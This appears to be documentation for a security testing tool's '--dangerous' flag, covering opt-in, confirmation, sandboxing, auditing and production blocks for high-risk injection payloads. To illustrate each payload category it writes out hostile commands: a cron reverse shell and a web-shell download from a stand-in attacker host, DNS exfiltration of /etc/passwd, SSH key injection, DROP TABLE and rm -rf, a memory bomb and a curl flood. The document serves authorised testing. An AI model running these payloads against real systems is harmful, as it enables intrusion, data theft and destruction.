# Dangerous Payloads Configuration

Control access to high-risk payload injection types that could impact production systems or violate policies.

## Overview

Some payload injection techniques carry elevated risk due to their potential impact:

- **Resource exhaustion**: CPU, memory, or disk consumption
- **Service disruption**: Crashing applications or consuming all resources
- **Data manipulation**: Modifying or deleting data
- **System compromise**: Installing backdoors or persistence mechanisms
- **Policy violations**: Techniques that may violate compliance requirements

The `--dangerous` flag requires explicit opt-in for these payload types to prevent accidental misuse.

## Dangerous Payload Categories

### Resource Exhaustion Payloads

Payloads designed to consume resources:

```bash
# Infinite loop payload
payload: "while(true) {}"

# Memory allocation bomb
payload: "let arr = []; while(true) { arr.push(new Array(1000000)); }"

# Regex denial of service (ReDoS)
payload: "string.match(/((a+)+)+b/)"
```

These require `--dangerous` flag:

```bash
qai inject --dangerous \
  --payload-type resource-exhaustion \
  --target-url http://vulnerable-app.local
```

### Data Manipulation Payloads

Payloads that modify or destroy data:

```bash
# SQL deletion
payload: "'; DROP TABLE users; --"

# File system deletion
payload: "rm -rf /important/data"

# Database truncation
payload: "TRUNCATE TABLE orders"
```

Requires explicit flag:

```bash
qai inject --dangerous \
  --payload-type data-manipulation \
  --target-url http://vulnerable-app.local
```

<Warning>
Data manipulation payloads carry high risk. Always test in isolated environments first. Never run against production without explicit approval.
</Warning>

### Persistence Payloads

Payloads that establish long-term access:

```bash
# Cron-based backdoor
payload: "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/1234 0>&1\"' | crontab"

# SSH key injection
payload: "echo 'attacker-public-key' >> ~/.ssh/authorized_keys"

# Web shell installation
payload: "wget http://attacker.com/shell.php -O /var/www/html/shell.php"
```

Requires explicit authorization:

```bash
qai inject --dangerous \
  --payload-type persistence \
  --target-url http://vulnerable-app.local
```

### Privilege Escalation Payloads

Payloads that attempt to gain elevated privileges:

```bash
# Sudo exploitation
payload: "sudo -u root /bin/bash"

# SetUID binary exploitation
payload: "find / -perm -4000 2>/dev/null"

# Kernel exploit attempt
payload: "insmod /path/to/rootkit.ko"
```

Restricted by default:

```bash
qai inject --dangerous \
  --payload-type privilege-escalation \
  --target-url http://vulnerable-app.local
```

### Network-Based Attacks

Payloads that impact network infrastructure:

```bash
# DNS exfiltration
payload: "nslookup $(cat /etc/passwd | base64)@attacker.com"

# Network scanning
payload: "nmap -p- 10.0.0.0/8"

# DDoS reflection
payload: "for i in {1..10000}; do curl http://target.com & done"
```

Controlled by flag:

```bash
qai inject --dangerous \
  --payload-type network-attack \
  --target-url http://vulnerable-app.local
```

## Enabling Dangerous Payloads

### Command-Line Flag

Use the `--dangerous` flag to enable dangerous payload types:

```bash
# Basic usage
qai inject --dangerous \
  --framework owasp-top-10 \
  --target-url http://vulnerable-app.local

# With specific payload type
qai inject --dangerous \
  --payload-type resource-exhaustion \
  --target-url http://vulnerable-app.local

# Force dangerous (no confirmation prompt)
qai inject --dangerous --no-confirm \
  --target-url http://vulnerable-app.local
```

### Environment Variable

Set via environment for automation:

```bash
# Enable dangerous payloads
export QAI_DANGEROUS_PAYLOADS=true

# Then run without --dangerous flag
qai inject --framework owasp-top-10 --target-url http://vulnerable-app.local
```

### Configuration File

Define in `qai.json`:

```json
{
  "modules": {
    "inject": {
      "dangerous_payloads_enabled": false,
      "require_dangerous_flag": true,
      "dangerous_payload_types": [
        "resource-exhaustion",
        "data-manipulation",
        "persistence",
        "privilege-escalation",
        "network-attack"
      ]
    }
  }
}
```

## Safety Mechanisms

### Confirmation Prompt

When using `--dangerous`, you must confirm:

```bash
$ qai inject --dangerous --target-url http://localhost

⚠️  WARNING: Dangerous Payloads Enabled
═══════════════════════════════════════════════════════════════

This campaign will use high-risk payloads that could:
  • Cause service disruption or outages
  • Modify or delete data
  • Consume excessive resources
  • Establish persistent access
  • Violate compliance requirements

Target: http://localhost
Campaign: injection_abc123

Type 'yes' to confirm and proceed: yes

Starting dangerous payload campaign...
```

Skip confirmation with `--no-confirm` (dangerous):

```bash
qai inject --dangerous --no-confirm --target-url http://localhost
```

### Payload Limits

Dangerous payloads have built-in limits:

```json
{
  "modules": {
    "inject": {
      "resource_limits": {
        "cpu_timeout_seconds": 30,
        "memory_limit_mb": 512,
        "disk_write_limit_mb": 100,
        "execution_timeout_seconds": 60
      },
      "rate_limiting": {
        "payloads_per_minute": 10,
        "burst_limit": 5
      }
    }
  }
}
```

### Sandboxing

Payloads execute in isolated environments when possible:

```bash
# Run in Docker container (recommended for dangerous payloads)
qai inject --dangerous \
  --sandbox docker \
  --target-url http://vulnerable-app.local

# Run with resource limits (cgroups on Linux)
qai inject --dangerous \
  --sandbox cgroups \
  --memory-limit 512m \
  --cpu-limit 1 \
  --target-url http://vulnerable-app.local
```

## Approval and Auditing

### Audit Trail

All dangerous payload executions are logged:

```bash
# View dangerous payload history
qai audit dangerous-payloads

# Export audit log
qai audit dangerous-payloads --export json > dangerous_audit.json

# Filter by date range
qai audit dangerous-payloads --since 2024-03-01 --until 2024-03-31
```

Audit log entry:

```json
{
  "timestamp": "2024-03-22T10:30:15Z",
  "user": "security-engineer",
  "action": "dangerous_payload_executed",
  "campaign_id": "campaign_abc123",
  "payload_type": "data-manipulation",
  "target": "http://vulnerable-app.local",
  "result": "successful",
  "approver": "security-manager",
  "approval_ticket": "SEC-1234"
}
```

### Approval Workflows

Require approvals for dangerous payloads in automated workflows:

```yaml
# CI/CD approval requirement
name: Dangerous Payload Campaign
on: workflow_dispatch
jobs:
  dangerous_inject:
    environment:
      name: dangerous-payloads
      deployment-branch: main
    steps:
      - name: Run dangerous campaign
        run: |
          qai inject --dangerous \
            --target-url ${{ secrets.TARGET_URL }}
```

### Notification System

Alert on dangerous payload usage:

## Production Safeguards

### Prohibited Environments

Prevent dangerous payloads in production:

```bash
# Configure environment
export QAI_ENVIRONMENT=production

# This will block dangerous payloads
qai inject --dangerous --target-url http://prod-app.example.com
# Error: Dangerous payloads not allowed in production environment
```

Configuration:

```json
{
  "environment_restrictions": {
    "production": {
      "allow_dangerous": false,
      "requires_ticket": true,
      "requires_approval": true,
      "approval_timeout_hours": 1
    },
    "staging": {
      "allow_dangerous": true,
      "requires_ticket": false,
      "requires_approval": false
    },
    "development": {
      "allow_dangerous": true,
      "requires_ticket": false,
      "requires_approval": false
    }
  }
}
```

### Backup and Recovery

Always maintain backups before dangerous payloads:

```bash
# Automatic backup before dangerous payloads
qai inject --dangerous \
  --create-backup \
  --backup-location /backups/pre-injection \
  --target-url http://vulnerable-app.local
```

### Rollback Plan

Define rollback procedures:

```json
{
  "dangerous_payload_config": {
    "rollback_enabled": true,
    "rollback_timeout_minutes": 30,
    "automated_rollback_triggers": [
      "service_unavailable",
      "cpu_usage_above_90",
      "disk_full",
      "error_rate_above_5_percent"
    ]
  }
}
```

## Best Practices

1. **Always use dedicated test environments**: Never use dangerous payloads against production
2. **Get explicit approval**: Require documented approval from appropriate stakeholders
3. **Use sandboxing**: Run in containers or VMs with resource limits
4. **Maintain audit trails**: Log all dangerous payload activities
5. **Create backups**: Always backup before attempting data manipulation
6. **Set timeouts**: Configure execution timeouts to prevent infinite loops
7. **Monitor resources**: Watch CPU, memory, disk during execution
8. **Document rationale**: Explain why each dangerous payload is necessary
9. **Plan rollback**: Have procedures to undo changes
10. **Test with staging**: Test all payloads in staging before any other environment

## Disabling Dangerous Payloads

Completely disable dangerous payload support:

```json
{
  "modules": {
    "inject": {
      "dangerous_payloads_enabled": false,
      "block_dangerous_attempts": true,
      "log_dangerous_attempts": true
    }
  }
}
```

This prevents all dangerous payload execution, even with `--dangerous` flag.
